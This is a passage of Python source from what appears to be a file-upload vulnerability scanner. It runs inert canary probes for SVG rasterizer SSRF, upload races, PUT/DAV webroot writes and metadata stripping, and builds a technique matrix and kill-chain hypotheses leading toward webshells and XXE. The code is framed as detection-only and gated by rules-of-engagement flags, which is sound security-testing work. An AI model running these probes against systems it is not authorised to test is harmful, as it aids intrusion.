        rows.append({"family": fam, "status": r.status, "accepted": ok})
        if ok:
            fams.add(fam)
        if interrupted():
            break
    return {"rows": rows, "accepted": sorted(fams),
            "office_accepted": bool({"xlsx", "odt", "docx"} & fams),
            "archive_accepted": bool({"zip", "gz", "7z", "rar"} & fams),
            "html_accepted": "html" in fams}


def metadata_probe(http, url, param, fields, base_url, canary, meta, conf):
    """METADATA/PIPELINE ENGINE: PNG tEXt + JPEG COM canary survival ->
    re-encode/strip detection (server-side processing fingerprint).
    Content REDACTED - sirf dims/size/sha1-prefix/flags store hote hain."""
    b = canary.lower()
    out = {"rows": [], "transformed": False, "stripped": False,
           "reencoded": False}
    cases = [("png-text", "%s_md.png" % b, png_valid_text(canary),
              "image/png"),
             ("jpeg-com", "%s_md.jpg" % b, jpeg_com_segment(canary),
              "image/jpeg")]
    for fam, fname, content, ct in cases:
        r = _upload_once(http, url, param, fname, content, ct, fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, b, url)
        if not (sc >= 1 or r.status in (200, 201, 202)):
            out["rows"].append({"family": fam, "status": r.status,
                                "accepted": False})
            continue
        row = {"family": fam, "accepted": True,
               "up_sha1_12": hashlib.sha1(content).hexdigest()[:12],
               "up_size": len(content),
               "up_dims": png_dims(content) if fam == "png-text" else None}
        loc = locate_uploaded_url(r.text or "", base_url, b)
        if loc and conf.get("files_getback", True):
            try:
                rg = http.get(loc[0], allow_redirects=False)
                meta["probes_total"] = meta.get("probes_total", 0) + 1
                gb = rg.body or b""
                row["served"] = bool(rg.status == 200)
                row["gb_sha1_12"] = hashlib.sha1(gb).hexdigest()[:12]
                row["gb_size"] = len(gb)
                row["canary_survived"] = \
                    canary.encode("utf-8", "ignore") in gb
                row["gb_dims"] = png_dims(gb) if fam == "png-text" else None
                row["same_bytes"] = \
                    row.get("gb_sha1_12") == row["up_sha1_12"]
                if not row["same_bytes"]:
                    out["reencoded"] = True
                if row["canary_survived"] is False:
                    out["stripped"] = True
                if fam == "png-text" and row.get("gb_dims") and \
                        row.get("up_dims") and \
                        row["gb_dims"] != row["up_dims"]:
                    out["transformed"] = True
            except Exception as e:
                row["getback_error"] = truncate(str(e), 60)
        out["rows"].append(row)
    return out


def svg_ssrf_probe(http, url, param, fields, canary, meta, conf):
    """SVG-SSRF DIFFERENTIAL (RoE-GATED: files_allow_svg_ssrf). Same-origin
    <image href> rasterizer-fetch detection via status/len/latency diff.
    Zero external egress (paths target host par hi). Content REDACTED."""
    b = canary.lower()
    miss_path = "/waspP16nope_%s" % b
    variants = [("exists", svg_ssrf_bytes(canary, "/")),
                ("missing", svg_ssrf_bytes(canary, miss_path))]
    rows = []
    for lbl, content in variants:
        r = _upload_once(http, url, param, "%s_ssrf_%s.svg" % (b, lbl),
                         content, "image/svg+xml", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, b, url)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
        rows.append({"variant": lbl, "status": r.status, "accepted": ok,
                     "resp_len": len(r.body or b""),
                     "elapsed_ms": round((getattr(r, "elapsed", 0) or 0)
                                         * 1000, 1)})
    diff = False
    if len(rows) == 2 and rows[0].get("accepted") and \
            rows[1].get("accepted"):
        s0, s1 = rows[0], rows[1]
        diff = (s0["status"] != s1["status"]) or \
               (abs(s0["resp_len"] - s1["resp_len"]) > 40) or \
               (abs(s0["elapsed_ms"] - s1["elapsed_ms"]) > 350)
    if diff:
        signal = "svg-rasterizer-hypothesis"
    elif rows and all(x.get("accepted") for x in rows):
        signal = "svg-accepted-no-diff"
    else:
        signal = "svg-rejected"
    return {"rows": rows, "differential": diff, "signal": signal}


def race_window_probe(http, url, param, fields, canary, meta, conf):
    """RACE-WINDOW PROBE (RoE-GATED: files_allow_race, threads hard-cap 4).
    N<=4 INERT canary concurrent same-name uploads -> write-window
    hypothesis. Koi destructive effect nahi - sirf apne canary names."""
    n = max(2, min(4, int(conf.get("files_race_threads", 4))))
    b = canary.lower()
    name = "%s_race.png" % b

    def shoot(_i):
        return _upload_once(http, url, param, name, magic_png(canary),
                            "image/png", fields=fields)

    t0 = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
        rs = list(ex.map(shoot, range(n)))
    dur = time.time() - t0
    meta["probes_total"] = meta.get("probes_total", 0) + n
    rows, accepted = [], 0
    for r in rs:
        sc, _h = upload_success(r, b, url)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
        accepted += 1 if ok else 0
        rows.append({"status": getattr(r, "status", 0), "accepted": ok})
    if accepted == n:
        signal = "all-concurrent-succeeded"
    elif accepted:
        signal = "partial-accept"
    else:
        signal = "all-rejected"
    return {"threads": n, "name": name, "rows": rows, "accepted": accepted,
            "wall_ms": round(dur * 1000, 1), "signal": signal}


def put_method_probe(http, dir_url, canary, meta, allow_put=False):
    """PUT/DAV ENGINE: OPTIONS census (read-only, ungated) + PUT write
    (RoE-GATED: files_allow_put_method) -> DAV webroot-write detection.
    PUT body INERT canary text; target sirf canary-named file."""
    res = {"dir": dir_url, "options": None, "put": None,
           "dav_allowed": False, "put_write": False}
    b = canary.lower()
    try:
        ro = http.options(dir_url)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        allow = (ro.header("Allow") or ro.header("allow") or "")
        dav = (ro.header("DAV") or ro.header("dav") or "")
        res["options"] = {"status": ro.status, "allow": allow[:120],
                          "dav": dav[:20]}
        res["dav_allowed"] = ("PUT" in allow.upper()) or bool(dav)
    except Exception as e:
        res["options"] = {"error": truncate(str(e), 60)}
        return res
    if not (allow_put and res["dav_allowed"]):
        return res
    nm = "%s_put.png" % b
    target = dir_url.rstrip("/") + "/" + nm
    try:
        rp = http.request("PUT", target, data=plain_text(canary),
                          headers={"Content-Type": "application/"
                                   "octet-stream",
                                   "X-WASP-Probe": "P16-inert-put"},
                          force_write=True, allow_redirects=False)
    except ScopeError:
        raise
    except Exception as e:
        res["put"] = {"error": truncate(str(e), 60)}
        return res
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    res["put"] = {"status": rp.status, "url": target}
    if rp.status in (200, 201, 204):
        try:
            rg = http.get(target, allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            res["put_write"] = bool(rg.status == 200 and
                                    canary in (rg.text or ""))
        except Exception:
            pass
    return res


def storage_fingerprint(getback_r, located_urls, uploaded_leaf):
    """STORAGE FINGERPRINT (offline): response headers + leaf-shape ->
    backend + rename classification. Content kabhi store nahi hota."""
    h = {}
    try:
        h = dict(getback_r.headers or {}) if getback_r else {}
    except Exception:
        h = {}
    hlow = {str(k).lower(): str(v) for k, v in h.items()}
    server = hlow.get("server", "")
    backend = "unknown"
    if any(k.startswith("x-amz") for k in hlow) or "s3" in server.lower():
        backend = "s3"
    elif any(k.startswith("x-goog") for k in hlow) or \
            "gcs" in server.lower():
        backend = "gcs"
    elif any(k.startswith("x-ms-") for k in hlow) or \
            "azure" in server.lower():
        backend = "azure-blob"
    elif "cf-ray" in hlow:
        backend = "cloudflare-cdn"
    elif "nginx" in server.lower():
        backend = "nginx-local"
    elif "apache" in server.lower():
        backend = "apache-local"
    elif "microsoft-iis" in server.lower():
        backend = "iis-local"
    leaf = (located_urls[0].rsplit("/", 1)[-1].split("?")[0]
            if located_urls else "")
    stem = leaf.rsplit(".", 1)[0] if "." in leaf else leaf
    shape = "unknown"
    if not leaf:
        pass
    elif leaf == uploaded_leaf:
        shape = "original-name"
    elif re.fullmatch(r"[0-9a-f]{32}", stem):
        shape = "hash-md5"
    elif re.fullmatch(r"[0-9a-f]{40}", stem):
        shape = "hash-sha1"
    elif re.fullmatch(r"[0-9a-f-]{36}", stem):
        shape = "uuid"
    elif re.fullmatch(r"\d{10,14}", stem):
        shape = "timestamp"
    elif re.fullmatch(r"\d{1,8}", stem):
        shape = "sequential-id"
    elif leaf.rsplit(".", 1)[-1] == uploaded_leaf.rsplit(".", 1)[-1]:
        shape = "renamed-preserved-ext"
    keep = ("content-type", "content-disposition", "x-content-type-options",
            "etag", "cache-control")
    return {"backend": backend, "server": server[:40],
            "serving_headers": {k: hlow[k][:60] for k in keep if k in hlow},
            "leaf": leaf[:80], "leaf_shape": shape}


def rename_policy_analysis(upload_recs):
    """RENAME-POLICY (offline): uploaded leaf vs stored leaf votes ->
    policy enum + enumeration risk flag."""
    votes = []
    for r in upload_recs:
        loc = r.get("located_urls") or []
        canary = (r.get("canary") or "").lower()
        up = "%s.png" % canary
        for u in loc[:1]:
            leaf = u.rsplit("/", 1)[-1].split("?")[0]
            stem = leaf.rsplit(".", 1)[0] if "." in leaf else leaf
            if not leaf:
                continue
            if leaf.lower() == up:
                votes.append("original")
            elif leaf.lower().startswith("waspp16"):
                # module canary-family name preserved (param-probe file) -
                # server ne diya gaya naam regenerate nahi kiya
                votes.append("original")
            elif re.fullmatch(r"[0-9a-f]{32}", stem):
                votes.append("hashed")
            elif re.fullmatch(r"[0-9a-f-]{36}", stem):
                votes.append("uuid")
            elif re.fullmatch(r"\d{10,14}", stem):
                votes.append("timestamped")
            elif re.fullmatch(r"\d{1,8}", stem):
                votes.append("sequential")
            elif leaf.rsplit(".", 1)[-1] == up.rsplit(".", 1)[-1]:
                votes.append("renamed-preserved-ext")
            else:
                votes.append("prefixed-mangled")
    policy = max(set(votes), key=votes.count) if votes else "unknown"
    return {"policy": policy, "samples": len(votes),
            "enumeration_risk": policy in ("original", "sequential",
                                           "timestamped")}


def build_mitre_map():
    """MITRE/CWE/OWASP mapping (detection triage ke liye - static)."""
    return {
        "cwe": {
            "CWE-434": "Unrestricted Upload of File with Dangerous Type",
            "CWE-22": "Path Traversal (pathname restriction gap)",
            "CWE-436": "Interpretation Conflict (parser differential)",
            "CWE-646": "Reliance on File Name or Extension",
            "CWE-73": "External Control of File Name or Path",
            "CWE-611": "Improper Restriction of XML External Entity",
            "CWE-1236": "CSV Formula Elements (import chain)",
            "CWE-400": "Uncontrolled Resource Consumption (size census)"},
        "attack": {
            "T1505.003": "Server Software Component: Web Shell (MANUAL)",
            "T1190": "Exploit Public-Facing Application",
            "T1005": "Data from Local System (XXE/import chain)",
            "T1083": "File and Directory Discovery (listing/getback)"},
        "owasp_wstg": {
            "WSTG-BUSL-09": "Test Upload of Malicious File",
            "WSTG-ATHZ-02": "Bypassing Authorization Schema (anon getback)",
            "WSTG-ERRH-01": "Error differential (parser/rasterizer)"},
        "cheatsheets": ["OWASP File Upload Cheat Sheet",
                        "PortSwigger: File upload vulnerabilities",
                        "CWE-434 mitigation patterns"],
        "note": "mapping detection/triage support ke liye - module "
                "detection-only hai, exploitation kabhi nahi"}


def build_exec_summary_md(meta, upload_recs, import_recs, archive_recs,
                          deep_recs, chains, conf):
    """EXEC_SUMMARY.md - human-readable one-pager (CISO/lead brief)."""
    up_c = [r for r in upload_recs if r.get("verdict") == "CONFIRMED"]
    up_s = [r for r in upload_recs if r.get("verdict") == "SUSPECTED"]
    up_h = [r for r in upload_recs if r.get("verdict") == "HARDENED"]
    up_b = [r for r in upload_recs if r.get("verdict") == "BLOCKED"]
    imp_c = [r for r in import_recs if r.get("verdict") == "CONFIRMED"]
    gates = [k for k in ("files_allow_import_xxe", "files_allow_archive",
                         "files_allow_cleanup", "files_allow_svg_ssrf",
                         "files_allow_put_method", "files_allow_race")
             if conf.get(k)]
    L = ["# Phase 16 - File Upload ULTRA (EXEC SUMMARY)", "",
         "Generated: %s | mode: %s | probes: %s" % (
             now_iso(), "detection-only", meta.get("probes_total", 0)), "",
         "## Verdict snapshot", "",
         "- CONFIRMED upload gaps: **%d** (%s)" % (
             len(up_c), ", ".join(r["url"][:40] for r in up_c[:3])),
         "- SUSPECTED: **%d** | HARDENED: **%d** | BLOCKED: **%d**" % (
             len(up_s), len(up_h), len(up_b)),
         "- Import-XXE confirmed: **%d** (gate-controlled)" % len(imp_c),
         "- Kill-chains: **%d** | deep-dive endpoints: **%d**" % (
             len(chains), len(deep_recs)), "",
         "## Top techniques observed", ""]
    seen = set()
    for r in upload_recs + import_recs:
        tech = r.get("technique") or ""
        if tech and tech not in seen:
            seen.add(tech)
            L.append("- `%s` @ %s" % (tech, r.get("url", "")[:50]))
        for s in (r.get("signals") or [])[:4]:
            k = "sig:%s" % s
            if k not in seen and not s.startswith("get-404"):
                seen.add(k)
                L.append("- signal `%s`" % s)
    L += ["", "## RoE gates (is run me)", "",
          "- ON: %s" % (", ".join(gates) if gates else "koi nahi (default OFF)"),
          "- OFF gates ke manual payloads `upload_payloads/` me ready hain", "",
          "## Discipline", "",
          "- 100% INERT content (FORBIDDEN_CONTENT_PATTERNS enforced)",
          "- getback content REDACTED (sha1/size/dims only)",
          "- webshell/htaccess/user.ini/zip-bomb/EICAR: FORBIDDEN-AUTO", ""]
    return "\n".join(L)


def differential_summary(upload_recs, import_recs, archive_recs, conf):
    up = [r for r in upload_recs if r.get("verdict") in ("CONFIRMED",
                                                         "SUSPECTED")]
    hard = [r for r in upload_recs if r.get("verdict") == "HARDENED"]
    blocked = [r for r in upload_recs if r.get("verdict") == "BLOCKED"]
    return {
        "upload_endpoints": len(upload_recs),
        "confirmed": len([r for r in upload_recs
                          if r.get("verdict") == "CONFIRMED"]),
        "suspected": len([r for r in upload_recs
                          if r.get("verdict") == "SUSPECTED"]),
        "hardened": len(hard), "blocked": len(blocked),
        "import_endpoints": len(import_recs),
        "import_confirmed": len([r for r in import_recs
                                 if r.get("verdict") == "CONFIRMED"]),
        "import_skipped": len([r for r in import_recs
                               if r.get("verdict") == "SKIPPED"]),
        "archive_endpoints": len(archive_recs),
        "archive_gated": len([r for r in archive_recs if r.get("gated")]),
        "risky_ext_accepts": sorted({a for r in up
                                     for a in r.get("accepted_risky", [])}),
        "served_exec_endpoints": [r["url"] for r in up if r.get("served_exec")],
        "traversal_endpoints": [r["url"] for r in upload_recs
                                if any(s.startswith("filename-traversal")
                                       for s in r.get("signals", []))],
    }

# ===========================================================================
# STAGE I: TECHNIQUE MATRIX (45+ rows; MANUAL-ONLY rows documented)
# ===========================================================================
def build_technique_matrix(upload_recs, import_recs, archive_recs, listings,
                           conf, deep=None, put_recs=None,
                           storage_stage=None):
    rows = []
    up_conf = [r for r in upload_recs if r.get("verdict") == "CONFIRMED"]
    up_susp = [r for r in upload_recs if r.get("verdict") == "SUSPECTED"]
    up_hard = [r for r in upload_recs if r.get("verdict") == "HARDENED"]

    def row(tech, family, status, verdict, note, gate=""):
        rows.append({"technique": tech, "family": family, "status": status,
                     "verdict": verdict, "note": note, "gate": gate})

    # ---- tested (auto) ----
    row("benign-upload-census", "census", "TESTED",
        "CONFIRMED" if upload_recs else "NOISE",
        "%d endpoints; param autodetect + benign png accept rate"
        % len(upload_recs))
    for lbl in ("plain-dangerous", "double-ext", "reverse-double", "case-trick",
                "mixed-case", "trailing-dot", "trailing-space",
                "trailing-dot-space", "semicolon-win", "nullbyte-legacy",
                "phtml", "dot-prefix", "fullwidth-dot", "shtml", "jsp"):
        hit = [r for r in upload_recs
               if any(x.get("label") == lbl and x.get("accepted")
                      for x in r.get("ext_matrix", []))]
        row("ext-%s" % lbl, "extension-filter", "TESTED",
            "CONFIRMED" if hit else ("REJECTED" if upload_recs else "NOT-RUN"),
            "%d/%d endpoints ne accept kiya" % (len(hit), len(upload_recs)))
    ct_hits = [r for r in upload_recs if r.get("ct_spoof_accepted")]
    row("ct-spoof", "mime-validation", "TESTED",
        "CONFIRMED" if ct_hits else ("REJECTED" if upload_recs else "NOT-RUN"),
        "CT whitelist %s" % ("bypassed" if ct_hits else "present"))
    mm = [r for r in upload_recs if "magic-missing" in r.get("signals", [])]
    row("magic-byte-gif89a", "content-inspection", "TESTED",
        "CONFIRMED" if mm else ("HARDENED" if upload_recs else "NOT-RUN"),
        "INERT GIF89a-as-png differential")
    tv = [r for r in upload_recs
          if any(s.startswith("filename-traversal") for s in
                 r.get("signals", []))]
    row("filename-traversal", "path-abuse", "TESTED",
        "CONFIRMED" if tv else ("HARDENED" if upload_recs else "NOT-RUN"),
        "../ filename accepted + leaf-parse proof")
    ov = [r for r in upload_recs
          if r.get("overwrite_probe", {}).get("overwritten")]
    row("same-name-overwrite", "storage", "TESTED",
        "CONFIRMED" if ov else ("HARDENED" if upload_recs else "NOT-RUN"),
        "canary overwrite differential")
    gb = [r for r in upload_recs if r.get("getback")]
    row("getback-serve-analysis", "serve", "TESTED",
        "CONFIRMED" if [r for r in gb if r.get("served_exec")] else
        ("SUSPECTED" if gb else "NOT-RUN"),
        "CT/CD/nosniff + content-match (redacted)")
    anon = [r for r in upload_recs if r.get("anon_getback", {}).get("served")]
    row("unauth-getback", "access-control", "TESTED",
        "CONFIRMED" if anon else ("HARDENED" if gb else "NOT-RUN"),
        "anonymous GET-back differential (P11 handoff)")
    dl = [d for d in listings if d.get("listing")]
    row("dir-listing", "storage", "TESTED", "CONFIRMED" if dl else "HARDENED",
        "%d dirs me listing enabled" % len(dl))
    svg_imp = [r for r in import_recs if "svg-accepted" in r.get("signals", [])]
    row("svg-plain-accept", "import-parser", "TESTED",
        "CONFIRMED" if svg_imp else ("HARDENED" if import_recs else "NOT-RUN"),
        "benign SVG accept census")
    docx_imp = [r for r in import_recs
                if "docx-accepted" in r.get("signals", [])]
    row("docx-import-accept", "import-parser", "TESTED",
        "CONFIRMED" if docx_imp else ("HARDENED" if import_recs else "NOT-RUN"),
        "benign docx zip accept census")
    imp_xxe = [r for r in import_recs if r.get("verdict") == "CONFIRMED"]
    row("import-xxe-entities", "import-parser", "TESTED" if any(
        r.get("gate_xxe") for r in import_recs) else "GATED",
        "CONFIRMED" if imp_xxe else "SKIPPED",
        "svg/docx entity payload differential",
        gate="files_allow_import_xxe")
    zs = [r for r in archive_recs if not r.get("gated")]
    row("zip-slip-archive", "archive", "TESTED" if zs else "GATED",
        "SUSPECTED" if [r for r in zs if r.get("slip_reflected")] else
        "SKIPPED", "INERT ../ entry differential",
        gate="files_allow_archive")
    cl = [r for r in upload_recs if r.get("cleanup")]
    row("cleanup-delete", "hygiene", "TESTED" if cl else "GATED",
        "INFO" if cl else "SKIPPED", "apne canary files ka best-effort DELETE",
        gate="files_allow_cleanup")
    sz = [r for r in upload_recs if r.get("probes", {}).get("benign")]
    row("size-limit-census", "dos", "TESTED", "HYPOTHESIS",
        "2KB-capped uploads; 413 kabhi nahi dekha (bounded)")

    # ---- hardened positives ----
    if up_hard:
        row("whitelist+rename", "hardening", "TESTED", "HARDENED",
            "%d endpoints whitelist/rename/sanitize karte hain" % len(up_hard))

    # ---- v17 deep-dive tested rows ----
    for d in (deep or []):
        em = d.get("ext_model") or {}
        if em:
            row("ext-acceptance-model", "extension-filter", "TESTED",
                {"no-validation": "CONFIRMED",
                 "blacklist-gapped": "CONFIRMED",
                 "partial-filter": "SUSPECTED",
                 "whitelist-or-sanitizer": "HARDENED"}.get(
                     em.get("model"), "INFO"),
                "%s model | %d accepted / %d rejected" % (
                    em.get("model"), len(em.get("accepted", [])),
                    len(em.get("rejected", []))))
        cf = d.get("confusion") or {}
        if cf:
            row("multipart-parser-confusion", "filter-evasion", "TESTED",
                "CONFIRMED" if cf.get("parser_signal") == "parser-lenient"
                else ("HARDENED" if cf.get("parser_signal") ==
                      "parser-strict" else "SUSPECTED"),
                "%s | %d/%d variants accepted" % (
                    cf.get("parser_signal"),
                    len(cf.get("accepted", [])),
                    len(cf.get("rows", []))))
        mc = d.get("magic_consistency") or {}
        if mc:
            row("magic-consistency", "content-inspection", "TESTED",
                "CONFIRMED" if mc.get("inspection_depth") ==
                "no-content-inspection" else
                ("SUSPECTED" if mc.get("inspection_depth") ==
                 "ext-ct-only" else "HARDENED"),
                "%s (%s)" % (mc.get("inspection_depth"),
                             ",".join(mc.get("accepted", [])[:2])))
        cb = d.get("client_bypass") or {}
        if cb.get("rows"):
            row("client-side-bypass", "validation", "TESTED",
                "CONFIRMED" if (cb.get("client_only_limit") or
                                cb.get("client_only_accept"))
                else "HARDENED",
                "limit=%s hints=%s" % (cb.get("max_file_size"),
                                       cb.get("accept_hints")))
        ex = d.get("exotic") or {}
        if ex:
            row("exotic-format-accept", "import-parser", "TESTED",
                "CONFIRMED" if ex.get("office_accepted") else
                ("SUSPECTED" if ex.get("accepted") else "HARDENED"),
                "accepted=%s" % ",".join(ex.get("accepted", [])[:5]))
        md = d.get("metadata") or {}
        if md.get("rows"):
            row("metadata-pipeline", "processing", "TESTED",
                "CONFIRMED" if (md.get("transformed") or
                                md.get("stripped") or
                                md.get("reencoded")) else "INFO",
                "transformed=%s stripped=%s reencoded=%s" % (
                    md.get("transformed"), md.get("stripped"),
                    md.get("reencoded")))
        ss = d.get("svg_ssrf")
        if ss is not None:
            row("svg-ssrf-differential", "processor-ssrf", "TESTED",
                "CONFIRMED" if ss.get("differential") else "NOISE",
                "%s (same-origin only)" % ss.get("signal"),
                gate="files_allow_svg_ssrf")
        rr = d.get("race")
        if rr is not None:
            row("race-window-probe", "toctou", "TESTED",
                "SUSPECTED" if rr.get("signal") in
                ("all-concurrent-succeeded", "partial-accept")
                else "NOISE",
                "%s (threads=%s)" % (rr.get("signal"), rr.get("threads")),
                gate="files_allow_race")
    if put_recs:
        row("put-dav-census", "server-config", "TESTED",
            "CONFIRMED" if [p for p in put_recs if p.get("dav_allowed")]
            else "HARDENED",
            "%d dirs OPTIONS census" % len(put_recs))
        wr = [p for p in put_recs if p.get("put_write")]
        row("put-dav-write", "rce-prep",
            "TESTED" if conf.get("files_allow_put_method") else "GATED",
            "CONFIRMED" if wr else "SKIPPED",
            "INERT canary PUT + getback verify",
            gate="files_allow_put_method")
    stg = storage_stage or {}
    if stg:
        rp = stg.get("rename_policy") or {}
        row("rename-policy", "storage", "TESTED", "INFO",
            "policy=%s enumeration_risk=%s" % (rp.get("policy"),
                                               rp.get("enumeration_risk")))

    # ---- MANUAL-ONLY (kabhi auto nahi) ----
    row("webshell-upload", "rce", "FORBIDDEN-AUTO", "MANUAL",
        "INERT discipline - koi shell payload kabhi build/upload nahi hota")
    row("htaccess-userini-webconfig", "server-config", "FORBIDDEN-AUTO",
        "MANUAL", "config mutation sirf apne lab me")
    row("race-condition-upload", "toctou", "MANUAL-ONLY", "MANUAL",
        "concurrent check-then-use window (fingerprint ke saath)")
    row("jpeg-php-gd-polyglot", "polyglot", "MANUAL-ONLY", "MANUAL",
        "re-coding pipeline differential chahiye")
    row("exif-metadata-xss", "polyglot", "MANUAL-ONLY", "MANUAL",
        "EXIF comment canary (viewer-dependent)")
    row("imagetragick-mvg", "processor", "MANUAL-ONLY", "MANUAL",
        "ImageMagick delegate family - version fingerprint pehle")
    row("ffmpeg-hls-ssrf", "processor", "MANUAL-ONLY", "MANUAL",
        "HLS playlist -> P15 SSRF chain (media variant)")
    row("phar-deserialization", "php", "MANUAL-ONLY", "MANUAL",
        "phar:// stream wrapper (PHP fingerprint chahiye)")
    row("pdf-embedded-xxe", "polyglot", "MANUAL-ONLY", "MANUAL",
        "PDF parser endpoints (P15 pdfgen handoff)")
    row("chunked-upload-bypass", "filter-evasion", "MANUAL-ONLY", "MANUAL",
        "boundary/chunk smuggling - WAF differential ke saath")
    row("ntfs-ads-filename", "filesystem", "MANUAL-ONLY", "MANUAL",
        "Alternate Data Stream naming (windows-only)")
    row("8dot3-shortname", "filesystem", "MANUAL-ONLY", "MANUAL",
        "legacy FAT short-name collision")
    row("csv-formula-injection", "import", "MANUAL-ONLY", "MANUAL",
        "P12 CSV chain handoff (spreadsheet import)")
    row("s3-presigned-blob-abuse", "cloud", "MANUAL-ONLY", "MANUAL",
        "presign scope/policy abuse - P24 handoff")
    row("zip-bomb", "dos", "FORBIDDEN-AUTO", "MANUAL",
        "DoS payloads kabhi nahi - sirf size-census")
    row("null-byte-modern", "filter-evasion", "HYPOTHESIS", "MANUAL",
        "modern runtimes immune; legacy fingerprint note")
    row("eicar-test-string", "av-bypass", "FORBIDDEN-AUTO", "MANUAL",
        "real AV signature - kabhi build/upload nahi hota (INERT discipline)")
    row("png-decompression-bomb", "dos", "FORBIDDEN-AUTO", "MANUAL",
        "pixel-flood/bomb destructive - sirf size-census karta hai module")
    row("php-filter-wrapper", "php", "MANUAL-ONLY", "MANUAL",
        "php://filter chain P13 handoff (LFI confirmed hona chahiye)")
    row("svg-foreignobject-xss", "polyglot", "MANUAL-ONLY", "MANUAL",
        "foreignObject/use census INERT hai; live PoC sirf lab me")
    row("filename-crlf-injection", "header-injection", "MANUAL-ONLY",
        "MANUAL", "filename me CRLF - WAF/parser smuggling manual wave")
    row("exiftool-cmdi", "processor", "MANUAL-ONLY", "MANUAL",
        "metadata survival census surface deta hai; cmdi manual confirm")
    row("http2-upload-smuggling", "transport", "MANUAL-ONLY", "MANUAL",
        "H2/H1 desync upload variant - advanced manual wave")
    return rows


# ===========================================================================
# STAGE J: KILL-CHAINS + HYPOTHESES
# ===========================================================================
def build_files_chains(F, upload_recs, import_recs, archive_recs, listings, put_recs=None):
    chains = []
    sig_of = lambda r: " | ".join(r.get("signals", [])[:3])

    def chain(name, severity, steps, basis, manual=False):
        chains.append({"name": name, "severity": severity, "steps": steps,
                       "basis": basis, "manual_wave": manual})

    exec_serve = [r for r in upload_recs if r.get("served_exec")]
    if exec_serve:
        chain("Upload -> exec-CT storage -> webshell-ready", "critical",
              ["risky filename accepted (%s)" % ", ".join(
                  exec_serve[0].get("accepted_risky", [])[:3])],
              "served_exec endpoints: %s" % exec_serve[0]["url"],
              manual=True)
    trav = [r for r in upload_recs
            if any(s.startswith("filename-traversal") for s in
                   r.get("signals", []))]
    if trav:
        chain("Filename traversal -> webroot escape -> arbitrary create",
              "critical",
              ["../ accepted (%s)" % sig_of(trav[0])[:80]],
              trav[0]["url"])
    imp = [r for r in import_recs if r.get("verdict") == "CONFIRMED"]
    if imp:
        chain("Upload -> docx/SVG import XXE -> file read -> config creds",
              "critical", ["parser entity processed (%s)" % imp[0].get(
                  "technique", "")], imp[0]["url"])
    svg_inline = [r for r in upload_recs
                  if any(x.get("serve_verdict") == "SERVED_SVG_INLINE"
                         for x in (r.get("getback") or {}).get("results", [])
                         if isinstance(x, dict))] if False else []
    svg_c = [r for r in upload_recs
             if any((x.get("serve") or {}).get("serve_verdict") ==
                    "SERVED_SVG_INLINE" for x in r.get("ext_matrix", []))]
    if svg_c:
        chain("Upload -> SVG inline serve -> stored-XSS -> session (P13)",
              "high", ["svg served image/svg+xml inline"],
              svg_c[0]["url"])
    anon = [r for r in upload_recs
            if r.get("anon_getback", {}).get("served")]
    if anon:
        chain("Upload -> unauthenticated getback -> PII/data exposure (P11)",
              "high", ["anon fetch 200 + content match"], anon[0]["url"])
    dl = [d for d in listings if d.get("listing")]
    if dl:
        chain("Dir listing -> user-file enumeration -> targeting aid", "medium",
              [dl[0]["dir"]], "Index of/")
    ov = [r for r in upload_recs
          if r.get("overwrite_probe", {}).get("overwritten")]
    if ov:
        chain("Overwrite -> file-hijack/deface -> account-takeover assist",
              "medium", ["same-name canary overwrite proof"], ov[0]["url"])
    zs = [r for r in archive_recs if r.get("slip_reflected")]
    if zs:
        chain("Zip-slip -> arbitrary write -> RCE-prep", "critical",
              ["traversal entry extracted hypothesis"], zs[0]["url"])
    no_val = [r for r in upload_recs
              if r.get("technique") == "upload-no-validation" or
              "overwrite-same-name" in r.get("signals", [])]
    if no_val:
        chain("No-validation upload -> manual webshell (RoE+lab)", "critical",
              ["sab ext accepted"], no_val[0]["url"], manual=True)
    deep_ss = [r for r in upload_recs
               if ((r.get("deep") or {}).get("svg_ssrf") or {}).get(
                   "differential")]
    if deep_ss:
        chain("Upload SVG -> rasterizer same-origin fetch -> internal SSRF "
              "(P15 chain)", "high",
              ["svg-rasterizer-hypothesis (status/len/latency diff)"],
              deep_ss[0]["url"])
    deep_md = [r for r in upload_recs
               if ((r.get("deep") or {}).get("metadata") or {}).get(
                   "transformed")]
    if deep_md:
        chain("Server-side image transform -> Imagick/GD surface -> "
              "Imagetragick/MVG (MANUAL)", "medium",
              ["PNG dims changed -> processing pipeline present"],
              deep_md[0]["url"], manual=True)
    deep_race = [r for r in upload_recs
                 if ((r.get("deep") or {}).get("race") or {}).get("signal")
                 in ("all-concurrent-succeeded", "partial-accept")]
    if deep_race:
        chain("Race window -> check-then-use TOCTOU -> security-bypass "
              "upload", "high",
              ["concurrent same-name canaries accepted"],
              deep_race[0]["url"], manual=True)
    for p in (put_recs or []):
        if p.get("put_write"):
            chain("DAV/PUT enabled -> webroot write -> RCE-prep",
                  "critical",
                  ["INERT canary PUT + GET-back verified"],
                  p.get("dir", ""), manual=True)
            break
    chain("Upload -> imagetragick/GD -> SSRF/RCE", "high",
          ["processor fingerprint + MVG canary"], "MANUAL-ONLY", manual=True)
    if F.items:
        chain("Report chain: %d upload findings aggregated" % len(F.items),
              "info", ["detection-only"], "files_test_plan.md")
    return chains


def build_files_hypotheses(upload_recs, import_recs, archive_recs, conf):
    hyps = []
    gates = {"files_allow_import_xxe": bool(conf.get("files_allow_import_xxe")),
             "files_allow_archive": bool(conf.get("files_allow_archive")),
             "files_allow_cleanup": bool(conf.get("files_allow_cleanup"))}
    for r in import_recs:
        if r.get("verdict") == "SKIPPED":
            hyps.append({"hypothesis": "Import XXE @ %s (svg/docx entity "
                         "differential)" % r["url"],
                         "payloads": "upload_payloads/svg_entity.svg, "
                                     "docx_entity_import.docx",
                         "gate": "files_allow_import_xxe"})
            break
    if not gates["files_allow_archive"]:
        hyps.append({"hypothesis": "Zip-slip @ archive-accept endpoints "
                     "(extraction differential)",
                     "payloads": "upload_payloads/zipslip_canary.zip",
                     "gate": "files_allow_archive"})
    hyps.append({"hypothesis": "Race-condition upload (check-then-use window) "
